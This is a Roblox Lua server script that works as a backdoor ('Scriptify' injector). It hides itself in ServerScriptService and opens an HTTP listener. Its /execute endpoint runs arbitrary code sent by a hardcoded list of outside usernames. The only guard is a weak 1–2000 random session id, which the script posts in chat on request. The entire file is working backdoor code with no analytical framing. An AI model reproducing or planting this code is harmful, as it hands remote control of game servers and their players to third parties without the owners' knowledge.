script.Parent = game.ServerScriptService.ServerifyInjector
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local ModulesFolder = script.Parent.Modules

local LuaExp = require(ModulesFolder.LuaExp)
local Loadstring = require(ModulesFolder.Loadstring)

local Whitelist = {
	"DanXvoalt",
	"Tubers93_alt26",
	"Vrs_006Virus",
	"ServerifySoftworks"
}

local attached = false
local currsessionid = tostring(math.random(1, 2000))

coroutine.wrap(function ()
	local app = LuaExp()
	app.use(LuaExp.json)
	app.get("/", function (req, res)
		print('Got request to POST on "/"')
		res.status(200).send()
	end)
	app.post("/attach", function (req, res)
		local username = req.body['user']
		local sessionid = req.body['sessionid']
		if table.find(Whitelist, username) and Players:FindFirstChild(username) and sessionid == currsessionid then
			if attached == false then
				attached = true
				local event = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("CreateNotification")
				for _, plr in pairs(Players:GetPlayers()) do
					if table.find(Whitelist, plr.Name) then
						event:FireClient(plr, {
							Title = "Scriptify",
							Body = "Scriptify attached to game! You can execute scripts now!"
						})
					end
				end
			end
		end
		res.status(200).send()
	end)
	app.post("/execute", function (req, res)
		local event = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("CreateNotification")
		local code = req.body['code']
		local username = req.body['user']
		local sessionid = req.body['sessionid']
		if table.find(Whitelist, username) and Players:FindFirstChild(username) and sessionid == currsessionid then
			Loadstring(code)()
			event:FireClient(Players:FindFirstChild(username), {
				Title = "Scriptify",
				Body = "Script executed!"
			})
		end
		res.status(200).send()
	end)
	app.listen("ScriptifySession_".. game.PlaceId.. "_".. currsessionid, function (url, auth)
		print("ScriptifySession listen on ".. url)
		local ui = script.Parent.NotificationsGui
		ui:Clone().Parent = game:GetService("StarterGui")
		for _, plr in pairs(Players:GetPlayers()) do
			ui:Clone().Parent = plr.PlayerGui
		end
		local replicatedstoragefolder = script.Parent.ReplicatedStorage
		for _, obj in pairs(replicatedstoragefolder:GetChildren()) do
			obj:Clone().Parent = game:GetService("ReplicatedStorage")
		end
		coroutine.wrap(function ()
			for _, plr in pairs(Players:GetPlayers()) do
				plr.Chatted:Connect(function (msg, rec)
					if string.find(msg, "sessionid") then
						coroutine.wrap(function ()
							local event = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("CreateNotification")
							event:FireClient(Players:FindFirstChild(plr.Name), {
								Title = "Scriptify",
								Body = "Session id: ".. currsessionid
							})
						end)()
					end
				end)
			end
		end)()
	end)
end)()
